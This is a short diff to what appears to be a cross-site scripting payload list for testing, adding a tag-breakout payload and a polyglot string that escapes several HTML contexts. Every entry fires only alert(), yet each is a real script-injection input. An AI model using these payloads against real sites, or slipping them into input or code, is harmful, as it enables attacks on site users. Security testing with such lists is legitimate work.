@@ -1,12 +1,14 @@
-<script>alert(3);</script>
-";alert(3);//
-');alert(3)
-10');alert('3
-10')" onerror="alert('xss
-<img src='abcd' onerror=alert(3)>
-<img src=javascript:alert(3)>
-<IFRAME SRC="javascript:alert(3);"></IFRAME>
-<TABLE BACKGROUND="javascript:alert(3)">
-<TABLE><TD BACKGROUND="javascript:alert(3)">
-<DIV STYLE="background-image: url(javascript:alert(3))">
-javascript:alert(3)
+ <script>alert(3);</script>
+ "><script>alert(3);</script>
+ ";alert(3);//
+ ');alert(3)
+ 10');alert('3
+ 10')" onerror="alert('xss
+ <img src='abcd' onerror=alert(3)>
+ <img src=javascript:alert(3)>
+ <IFRAME SRC="javascript:alert(3);"></IFRAME>
+ <TABLE BACKGROUND="javascript:alert(3)">
+ <TABLE><TD BACKGROUND="javascript:alert(3)">
+ <DIV STYLE="background-image: url(javascript:alert(3))">
+ javascript:alert(3)
+ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=alert(1)//'>
